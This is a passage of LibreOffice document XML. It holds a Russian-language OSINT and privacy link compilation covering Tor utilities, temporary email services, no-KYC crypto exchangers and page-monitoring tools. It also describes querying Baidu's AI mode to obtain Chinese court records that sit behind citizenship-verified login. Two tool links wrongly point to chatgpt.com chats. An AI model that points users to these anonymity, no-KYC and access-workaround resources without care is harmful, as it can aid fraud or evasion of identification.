      <text:p text:style-name="P51">LocalMonero (http://localmonerogtziu43ox2deckftvuybtdo4hyvlfwj5r3nptt65xwqead.onion/blocks/)</text:p>
      <text:p text:style-name="P53">Бонус: BTC RPC Explorer (https://github.com/janoside/btc-rpc-explorer) - self-hosted обозреватель с выходом в Tor, работает вместе с кошельком Bitcoin Core.</text:p>
      <text:p text:style-name="P51">Работаем с Tor в 2025. Часть 1:</text:p>
      <text:p text:style-name="P51">1. toriptables2 (https://chatgpt.com/c/6928d631-ebf4-8325-97fb-e2745df17a7e) - утилита для Linux, которая перенаправляет весь сетевой трафик через Tor с помощью iptables;</text:p>
      <text:p text:style-name="P51">2. tor-ip-changer <text:s/>(https://github.com/seevik2580/tor-ip-changer) - cкрипт на Python, регулярно запрашивающий новую идентичность через Tor;</text:p>
      <text:p text:style-name="P51">3. Dark Syenite (https://github.com/CruelDev69/onion-link-validator) - простая тулза на Python для проверки валидности .onion ссылок;</text:p>
      <text:p text:style-name="P51">4. Tor Portable (https://github.com/Verity-Freedom/Tor-Portable) - портируемая версия ядра Tor + конфиги, удобный вариант для тех, кому нужен "мобильный" Tor без установки;</text:p>
      <text:p text:style-name="P57">5. Tor Bridges Proxy (https://github.com/zerolabnet/tor-bridges-proxy) - минималистичный образ Tor с SOCKS 5 proxy сервером, TorDNS и веб-интерфейсом с авторизацией для добавления мостов.</text:p>
      <text:p text:style-name="P58">Работаем с Tor в 2025. Часть 2:</text:p>
      <text:p text:style-name="P51">1. goldy/tor-hidden-service (https://hub.docker.com/r/goldy/tor-hidden-service) - это докер-образ, который сразу настраивает Tor так, чтобы он работал как Hidden Service. </text:p>
      <text:p text:style-name="P51">2. tor-controller (https://github.com/bugfest/tor-controller) - это Kubernetes-инструмент для управления инстансами Tor и скрытыми сервисами внутри кластеров Kubernetes;</text:p>
      <text:p text:style-name="P51">3. dperson/torproxy (https://hub.docker.com/r/dperson/torproxy) - минималистичный докер-образ Tor, с готовым SOCKS5-прокси и простым конфигом для быстрого запуска;</text:p>
      <text:p text:style-name="P51">4. TorghostNG (https://github.com/Zopolis4/TorghostNG) - аналог TorGhost/torguard, перенаправляющий весь трафик машины через Tor и автоматически предотвращающий утечки DNS;</text:p>
      <text:p text:style-name="P53">5. oniongen-go (https://chatgpt.com/c/692d5d1f-8dc0-8327-9401-5a2ab89958d3) - ультрабыстрый генератор vanity-адресов .onion (v3) на Go, намного быстрее классических python-решений.</text:p>
      <text:p text:style-name="P51">Сбор информации в OSINT это не всегда изучение чего-то, что уже произошло и не всегда это одноразовая работа в стиле “нашёл - забыл”. Бывают длящиеся задачи, когда нужно следить за событиями и изменением ситуации вокруг изучаемой цели. Делать это вручную - вариант, мягко говоря, не оптимальный. Можно что-то пропустить или где-то опоздать. Рассмотрим варианты автоматизации отслеживания событий и изменений:</text:p>
      <text:p text:style-name="P51">Google Alerts (https://www.google.com/alerts) - хороший вариант для отслеживания новостей и, в целом, новой информации по ключевым словам. Доступен выбор нужной страны и языка, а также категории источников. Результаты можно получать на почту или добавить в любую RSS-читалку.</text:p>
      <text:p text:style-name="P59">Inoreader (https://www.inoreader.com/) - продвинутый вариант мониторинга публикаций. Умеет отслеживать изменения на сайтах - как на уже существующих страницах, так и появление новых публикаций. Также умеет мониторить социальные сети, в том числе каналы в Telegram.</text:p>
      <text:p text:style-name="P60">Можно настроить правила и фильтры для конкретных ситуаций, например чтобы при появлении ключевых слов, фото или видео, он помечал такие записи тегом, складывал в отдельную подборку и отправлял уведомление. У бесплатной версии есть лимиты и ограничения.</text:p>
      <text:p text:style-name="P51">Pulse Media Scout (https://pulsemediascout.com/) - мониторинг упоминаний в СМИ и соцсетях. Неплохо, но инструмент для тех у кого много лишних денег, потому как ценник абсолютно себя не оправдывает. Самая дешевая месячная подписка (с ограничениями и лимитами) стоит дороже чем годовая на Inoreader - который конечно немного дольше настраивать, особенно в связке с Google Alerts, но в итоге работать будет лучше и вообще без лимитов.</text:p>
      <text:p text:style-name="P51">Мониторинг сайтов: </text:p>
      <text:p text:style-name="P51">https://distill.io - можно использовать как расширение браузера или установить <text:s/>приложение. В бесплатной версии отслеживает до 25 ссылок. Мониторит изменения на странице целиком или какое-то конкретное место. Ведёт журнал изменений т.е. запоминает когда и что изменилось.</text:p>
      <text:p text:style-name="P53">https://www.followthatpage.com - то же самое, но в чуть более упрощённом варианте. Добавляем ссылку на страницу и указываем свою почту. После добавления можно настроить фильтры. Фильтровать можно по строкам или по блокам. Уведомления будут приходить на почту. В бесплатной версии лимит 20 проверок/сутки (20 раз одну страницу или 20 разных по разу).</text:p>
      <text:p text:style-name="P51">Большая подборка сервисов временной почты. Часть 2:</text:p>
      <text:p text:style-name="P51">1. https://beeinbox.com/</text:p>
      <text:p text:style-name="P51">2. https://temporarymail.app/</text:p>
      <text:p text:style-name="P51">3. https://tempmailbox.net/</text:p>
      <text:p text:style-name="P51">4. https://tempmail.ing/</text:p>
      <text:p text:style-name="P51">5. https://tempmail.rip/</text:p>
      <text:p text:style-name="P51">6. https://tempmailg.com/</text:p>
      <text:p text:style-name="P51">7. https://mailpoof.com/</text:p>
      <text:p text:style-name="P51">8. https://mailgw.com/</text:p>
      <text:p text:style-name="P51">9. https://simplelogin.io/</text:p>
      <text:p text:style-name="P51">10. https://burnermail.io/</text:p>
      <text:p text:style-name="P51">11. https://trashmail.com/</text:p>
      <text:p text:style-name="P61">12. https://tememail.org/</text:p>
      <text:p text:style-name="P62">13. https://temporaryemail.in/</text:p>
      <text:p text:style-name="P51">14. https://tempmailmaster.io/</text:p>
      <text:p text:style-name="P51">15. https://tempmail100.com/</text:p>
      <text:p text:style-name="P51">16. https://boomlify.com/</text:p>
      <text:p text:style-name="P51">17. https://firetempmail.com/</text:p>
      <text:p text:style-name="P51">18. https://tmpinbox.com/</text:p>
      <text:p text:style-name="P51">19. https://www.tempmail.sbs/</text:p>
      <text:p text:style-name="P53">20. https://internxt.com/temporary-email</text:p>
      <text:p text:style-name="P51">Подборка обменников без KYC:</text:p>
      <text:p text:style-name="P51">1. eigenwallet <text:s/>(https://eigenwallet.org/) - новая версия UnstoppableSwap, атомные свопы Bitcoin -&gt; Monero;</text:p>
      <text:p text:style-name="P51">2. retoswap (https://retoswap.com/) <text:s/>- приватный, некастодиальный Р2Р. <text:s/>Построена на Haveno, Tor и Monero;</text:p>
      <text:p text:style-name="P51">3. XmrBazaar (https://xmrbazaar.com/) <text:s/>- известный в узких кругах р2р рынок по торговле Monero;</text:p>
      <text:p text:style-name="P51">4. CypherGoat (https://cyphergoat.com/) <text:s/>- обменник крипта-крипта с большим выбором торговых пар;</text:p>
      <text:p text:style-name="P53">5. BitBridge (http://t.me/bit_bridge_bot?start=r_n25sxi4rx0) <text:s/>- еще один известный в узких кругах обменник в Telegram.</text:p>
      <text:p text:style-name="P51">Расширения для браузера:</text:p>
      <text:p text:style-name="P51">https://printfriendly.com - позволяет сохранять страницы сайтов. Можно просто скринить страницу как есть, но реальная польза именно в сохранении в pdf, потому как есть возможность предварительно удалить ненужные области (рекламу, картинки и т.д.); </text:p>
      <text:p text:style-name="P51">https://notion.com/web-clipper <text:s/>- тоже сохранение страниц, но уже в Notion. Удобно при сборе информации - одной кнопкой всё содержимое страницы переезжает в нужную ветку Notion;</text:p>
      <text:p text:style-name="P63">https://github.com/Ademking/BetterViewer - расширение для работы с изображениями. Это наверно лучшее из всех подобных. Можно обрезать, менять размер, отражать, крутить, рисовать на картинке, добавлять текст, скачивать и т.д. В том числе, можно сразу посмотреть метаданные, или отправить картинку в tineye.com для поиска.</text:p>
      <text:p text:style-name="P64">Если приходилось собирать информацию по китайским ресурсам, то я вряд ли удивлю, если сообщу что китайцам не нравится когда “некитайцы” лазают по их реестрам, и прочим каталогам. А потому во многих подобных ресурсах введена авторизация с верификацией гражданства. <text:s/>Пример - реестр судебных решений China Judgments Online (https://wenshu.court.gov.cn), войти в который можно либо используя китайский номер телефона, либо соцсети. Очевидное решение - купить такой аккаунт. Это реально, но найти аккаунт верифицированный на гражданина Китая, это не самый лёгкий квест. Ну и время жизни подобного аккаунта - та ещё лотерея. Но есть способ проще. Суть его в том, что на подобные ресурсы могут ходить китайские ИИ. Причём можно не заморачиваться, а просто в baidu.com включит режим ответов ИИ. Описываю как это работает на примере реестра судебных решений: <text:s/></text:p>
      <text:p text:style-name="P51">Включаете режим ответов с ИИ. (Важный момент: запросы нужно писать на китайском. Он конечно английский тоже понимает, но ответы отличаются); </text:p>
      <text:p text:style-name="P51">Далее, если интересует, например, компания, просто вводите её название. В ответ он соберет общие сведения о ней; </text:p>
      <text:p text:style-name="P51">Далее, задаёте вопрос была ли эта компания участником судебных разбирательств и если была - то каких. В ответ он перечислит судебные споры в каких она принимала участие (если их много перечислит наиболее резонансные и даст статистику по количеству);</text:p>
      <text:p text:style-name="P51">Теперь нужно открыть вкладку “ход размышления” и там будут ссылки на конкретные решения суда (они кстати иногда открываются без авторизации), а также цитаты из самих судебных решений, причём целыми абзацами, <text:s/>и то какое решение принято судом, с номером дела и датой. </text:p>
      <text:p text:style-name="P51">Часто этого вполне достаточно для понимания ситуации, но если нужно больше - просто попросите рассказать больше про конкретное судебное заседание и в "ходе размышления" будет ещё больше информации из решения суда.</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Подзаголовок_20_Знак" style:display-name="Подзаголовок Знак" style:family="text">
      <style:text-properties fo:color="#5a5a5a" loext:opacity="100%" fo:font-size="12pt" fo:letter-spacing="0.026cm" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="Заголовок_20_1_20_Знак" style:display-name="Заголовок 1 Знак" style:family="text">
      <style:text-properties fo:color="#365f91" loext:opacity="100%" style:font-name="Cambria" fo:font-family="Cambria" style:font-pitch="variable" fo:font-size="16pt" style:font-size-asian="16pt" style:font-size-complex="16pt"/>
    </style:style>
    <style:style style:name="Unresolved_20_Mention" style:display-name="Unresolved Mention" style:family="text">
      <style:text-properties fo:color="#605e5c" loext:opacity="100%" style:font-name="Times New Roman" fo:font-family="'Times New Roman'" style:font-pitch="variable" fo:font-size="12pt" fo:background-color="#e1dfdd"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text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Segoe UI" fo:font-family="'Segoe UI'"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Нижний_20_колонтитул_20_Знак" style:display-name="Ниж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fo:language="en" fo:country="US" officeooo:rsid="0019e198"/>
    </style:style>
    <style:style style:name="MT2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#e3e3e3" loext:opacity="100%" fo:font-family="'Google Sans', Roboto" fo:font-size="10.5pt" fo:letter-spacing="normal" fo:language="en" fo:country="US" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="0019e19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Some materials can only be used for testing or educational purposes. All information indicated here is purely familiarization. Any use for selfish purposes violates the legislation of many countries. I do not in any case do not pretend to be authored by articles, guides, instructions and other things. Also, I do not pursue the goals to somehow discredit true authors and discredit their reputation. The request at the slightest questions and nuances to inform me according to the contact data left / Некоторые материалы могут использоваться только для тестирования или образовательных целей. Вся информация, указанная здесь, является чисто ознакомительной. Любое использование в корыстных целях нарушает законодательство множества стран. Я не в коем случае не претендую на авторство данных статей, гайдов, инструкций и прочего. Также не преследую цели как-то дискредитировать истинных авторов и опорочить их репутацию. Просьба при малейших вопросах и нюансах сообщать мне по оставленным контактным данным<text:span text:style-name="MT1">: </text:span><text:span text:style-name="MT2">gitlibrary10@gmail.com</text:span><text:span text:style-name="MT1">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21:25:39.681000000</meta:creation-date>
    <dc:date>2026-02-28T13:38:48.512626200</dc:date>
    <meta:editing-duration>PT1H18M54S</meta:editing-duration>
    <meta:editing-cycles>23</meta:editing-cycles>
    <meta:generator>LibreOffice/25.8.4.2$Windows_X86_64 LibreOffice_project/290daaa01b999472f0c7a3890eb6a550fd74c6df</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="144" meta:paragraph-count="1935" meta:word-count="27059" meta:character-count="236883" meta:non-whitespace-character-count="209420"/>
    <meta:user-defined meta:name="AppVersion">16.0000</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>